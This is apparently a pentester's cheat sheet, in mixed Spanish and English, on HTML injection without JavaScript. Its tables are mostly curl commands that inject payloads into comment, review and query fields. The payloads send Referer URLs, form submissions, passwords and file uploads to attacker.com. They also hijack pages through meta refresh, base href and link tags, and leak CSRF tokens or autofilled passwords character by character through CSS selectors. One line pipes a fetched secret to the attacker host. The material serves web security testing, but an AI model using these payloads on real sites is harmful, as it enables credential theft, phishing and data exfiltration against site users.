---
aliases:
  - No-JS HTML Injection
  - Scriptless XSS
  - CSS Injection
  - Base href Hijack
tags:
  - type/technique
  - vuln/html-injection
  - technique/exfiltration
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
kind: SubCheatSheet
linked:
  - '[[HTML Injection]]'
---
# HTML Injection - Inyección Sin Script

***

## Image `src` Exfil (Referer Leak)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -X POST -d 'comment=<img src="https://attacker.com/log">' https://target/comments` | Browser fetch → Referer header reveals page URL | Standard Referer leak. |
| `curl -X POST -d 'comment=<img src="//attacker.com/log">' https://target/comments` | Protocol-relative URL exfil | Same. |
| `curl 'https://target/reset?token=$TOKEN&msg=<img src=https://attacker.com/log>'` | Reflected — Referer leaks token-bearing URL | Sensitive URL leak. |
| `curl -X POST -d 'comment=<div style="background:url(https://attacker.com/log)"></div>' https://target/comments` | CSS background-image exfil | CSS img-src equivalent. |
| `curl -X POST -d 'comment=<img src="https://attacker.com/log" loading="lazy">' https://target/comments` | Lazy-loaded image stealth | Below-fold stealth. |
| `for i in {1..100}; do curl -X POST -d "comment=<img src=https://attacker.com/log?id=$i>" https://target/comments; done` | Bulk pixel storm analytics | Volume. |
| `curl -X POST -d 'comment=<style>.target:hover{background:url(//attacker.com/hover)}</style>' https://target/comments` | Hover-triggered tracker | UX-triggered. |
| `curl -X POST -d 'comment=<img srcset="https://attacker.com/log?dpr=1 1x, https://attacker.com/log?dpr=2 2x">' https://target/comments` | srcset DPR-aware tracker | Multi-resolution. |
| `curl -X POST -d 'comment=<picture><source srcset="https://attacker.com/track" media="(min-width:1px)"><img src="x"></picture>' https://target/comments` | Picture media-query trigger | Responsive trigger. |
| `<img src="https://attacker.com/poll?t=$(date +%s)">` injection per minute (cron-fed) | Poll-style persistent tracker | Persistent tracker. |
^htmli-noscript-image

___

## Form Action Redirect

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -X POST -d 'comment=<form action="https://attacker.com/log" method="POST"><input name="user"><input name="pass" type="password"><button>Login</button></form>' https://target/comments` | Form action external — captures submission | Form override. |
| `curl 'https://target/?q=<input name="creditcard" type="hidden" value="malicious">'` (inside legit form) | Hidden input pollution en existing form | Form pollution. |
| `curl -X POST -d 'desc=<form action="//attacker">... before <form action="/legit">' https://target/x` | Position-first attacker form wins | Order matters. |
| `curl -X POST -d 'review=<input type="submit" value="Login" formaction="//attacker.com">' https://target/reviews` | Form override via formaction attribute | HTML5 formaction. |
| `curl -X POST -d 'review=<input type="image" src="legit.png" formaction="//attacker.com">' https://target/reviews` | Image-disguised submit hijack | Image submit. |
| `curl -X POST -d 'review=<form action="//attacker" enctype="multipart/form-data" method=POST><input type=file name=f><input type=submit></form>' https://target/reviews` | Force file upload to attacker | File harvest. |
| `curl -X POST -d 'review=<form action="//attacker" target="_blank"><input name=p type=password><button>Submit</button></form>' https://target/reviews` | New-tab phish form | UX-aware. |
| `curl 'https://target/?p=<button form="legit-form" formaction="//attacker">Submit</button>'` | HTML5 button-form ownership | HTML5 ownership. |
| `curl -X POST -d 'comment=<input form="legit-form" name="redirect" value="//attacker">' https://target/comments` | Cross-context input ownership | Cross-form ownership. |
^htmli-noscript-form

___

## Meta Refresh

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl 'https://target/?msg=<meta http-equiv="refresh" content="0;url=https://attacker.com">'` | Instant auto-redirect | Head/body reflected. |
| `curl 'https://target/?msg=<meta http-equiv="refresh" content="5;url=https://attacker.com">'` | 5s delayed redirect | Stealth. |
| `curl 'https://target/?msg=<meta http-equiv="refresh" content="1;url=current_page">'` | Refresh loop DoS | DoS/persist. |
| `curl 'https://target/?msg=<meta http-equiv="refresh" content="0;url=https://target.com#malicious">'` | Fragment manipulation | Anchor abuse. |
| `curl 'https://target/?msg=<meta http-equiv="refresh" content="0;url=//attacker.com">'` | Protocol-relative redirect | Same effect. |
| `curl 'https://target/?msg=<meta http-equiv="set-cookie" content="session=ATTACKER_SID">'` (some browsers) | Cookie-set via meta (legacy) | Legacy browsers. |
| `curl 'https://target/?msg=<meta charset="utf-7">'` (charset injection) | Charset injection — UTF-7 XSS combo | Charset confusion. |
| `curl 'https://target/?msg=<meta name="referrer" content="unsafe-url">'` | Force Referer reveal full URL | Referer config override. |
| `curl 'https://target/?msg=<meta http-equiv="Content-Security-Policy" content="default-src *">'` | CSP override loosen | CSP weaken (if respected). |
| `curl 'https://target/?msg=<meta http-equiv="refresh" content="3;url=https://attacker.com/?d=$(curl -s https://target/secret \| base64)">'` | Combine con server-side fetch + exfil | Multi-stage. |
^htmli-noscript-meta

___

## `<base href>` Hijacking

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl 'https://target/?msg=<base href="https://attacker.com/">'` | Reroute all relative URLs to attacker | Head/body reflected. |
| `curl -X POST -d 'profile=<base href="https://attacker.com/">' https://target/profile` | Stored base href hijack | Persistent asset hijack. |
| `curl 'https://target/?msg=<base href="https://attacker.com/legit/">'` | Base con subpath mimics structure | Mimic. |
| `curl 'https://target/?msg=<base target="_blank">'` | All relative links open new tab | UX modification. |
| `curl 'https://target/?msg=<base href="https://attacker.com/">'` (head context placed before legit base) | First base wins — atacante base used | Position matters. |
| `curl 'https://target/?msg=<base href="//attacker.com/">'` | Protocol-relative base | Same effect. |
| `curl 'https://target/?msg=<base href="https://attacker.com/"><form action="/login"></form>'` (inline post-base) | Form action relative resolves to attacker | Form CSRF. |
| `curl 'https://target/?msg=<base href="https://attacker.com/"><link rel="stylesheet" href="theme.css">'` | Style poisoning via base | CSS poison. |
| `curl 'https://target/?msg=<base href="data:text/html,<script>alert(1)</script>">'` (some browsers) | data: scheme base edge | Edge browser. |
^htmli-noscript-base

### PoC base href hijack

```html
<!-- Legit page renders this in body después de input reflejado -->
<base href="https://attacker.com/">

<!-- Now original page contains: -->
<img src="logo.png">           <!-- carga de attacker.com/logo.png -->
<a href="/admin">Admin</a>     <!-- apunta a attacker.com/admin -->
<form action="/api/transfer">  <!-- submits to attacker -->
<link rel="stylesheet" href="theme.css">  <!-- loads attacker CSS -->
```

___

## `<link rel>` Manipulation

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl 'https://target/?head=<link rel="stylesheet" href="https://attacker.com/style.css">'` | External CSS poison | Style hijack. |
| `curl 'https://target/?head=<link rel="canonical" href="https://attacker.com/">'` | SEO canonical hijack | SEO impact. |
| `curl 'https://target/?head=<link rel="dns-prefetch" href="//attacker.com">'` | DNS prefetch — IP/hostname recon | Recon-side-channel. |
| `curl 'https://target/?head=<link rel="preconnect" href="//attacker.com">'` | TCP+TLS preconnect | Pre-connect leak. |
| `curl 'https://target/?head=<link rel="preload" href="//attacker.com/x" as="script">'` | Force resource preload | Bandwidth abuse. |
| `curl 'https://target/?head=<link rel="prefetch" href="//attacker.com/doc">'` | Document prefetch | Cache abuse. |
| `curl 'https://target/?head=<link rel="prerender" href="//attacker.com/doc">'` (deprecated) | Render off-screen | Privacy. |
| `curl 'https://target/?head=<link rel="manifest" href="//attacker.com/manifest.json">'` | PWA manifest hijack | Mobile PWA. |
| `curl 'https://target/?head=<link rel="alternate" hreflang="en" href="https://attacker.com/">'` | Hreflang i18n hijack | Multi-language. |
| `curl 'https://target/?head=<link rel="amphtml" href="https://attacker.com/amp">'` | AMP version hijack | Google AMP abuse. |
| `curl 'https://target/?head=<link rel="icon" href="//attacker.com/favicon.ico">'` | Favicon brand spoof | Brand spoof. |
| `curl 'https://target/?head=<link rel="search" type="application/opensearchdescription+xml" href="//attacker.com/o.xml">'` | OpenSearch hijack | Browser search engine. |
^htmli-noscript-linkrel

___

## CSS-Only Attacks (Cross-Site Styles)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -X POST -d 'comment=<link rel="stylesheet" href="https://attacker.com/style.css">' https://target/comments` | External CSS — attacker controls all styling | Style override. |
| `curl -X POST -d 'comment=<style>body{background:url("https://attacker.com/log")}</style>' https://target/comments` | Page-wide style with exfil | Page poisoning. |
| `curl -X POST -d 'comment=<style>input[name=csrf_token][value^="a"]{background:url("//attacker.com/?c=a")}input[name=csrf_token][value^="b"]{background:url("//attacker.com/?c=b")}</style>' https://target/comments` | CSS attribute selector char-by-char exfil | CSS keylogger. |
| `curl -X POST -d 'comment=<style>input:focus{background:url("//attacker.com/?focused=1")}</style>' https://target/comments` | Focus tracker CSS | UX-conditional. |
| `curl -X POST -d 'comment=<style>:checked + label{background:url("//attacker.com/?checked")}</style>' https://target/comments` | Checked state tracker | Form state exfil. |
| `curl -X POST -d 'comment=<style>@media print{body{background:url("//attacker.com/printed")}}</style>' https://target/comments` | Print-only exfil | Print-trigger. |
| `curl -X POST -d 'comment=<style>:root{--theme:url("https://attacker.com/var")}body{background:var(--theme)}</style>' https://target/comments` | CSS variable override | Modern CSS. |
| `curl -X POST -d 'comment=<style>body{animation:e 1s infinite}@keyframes e{from{background:url("//attacker.com/poll")}}</style>' https://target/comments` | CSS animation poll | Timing-based. |
| `curl -X POST -d 'comment=<style>@import url("https://attacker.com/poison.css")</style>' https://target/comments` | CSS @import chain | Style chain. |
| `curl 'https://target/?style=color:red;background:url(//attacker.com/log)'` (style attribute injection) | Attribute style inject | Attribute context. |
| `<style>input[name="password"][value="a"]~*{background:url(//attacker/?c=a)}</style>` (sibling selector) | Sibling-based exfil for password fields | Password exfil. |
^htmli-noscript-css

### CSS exfil via attribute selectors PoC

```html
<style>
  input[value^="a"] { background: url(//attacker.com/?c=a); }
  input[value^="b"] { background: url(//attacker.com/?c=b); }
  /* ... continue for all chars ... */
  input[value^="z"] { background: url(//attacker.com/?c=z); }
</style>

<!-- Si app render: <input value="USER_DATA">
     CSS evalúa primer char y triggers correspondiente background URL
     Browser fetches → atacante recibe primer char of value -->
```

Char-by-char exfiltration de input values (CSRF token, password de browser autofill) sin JS.

***
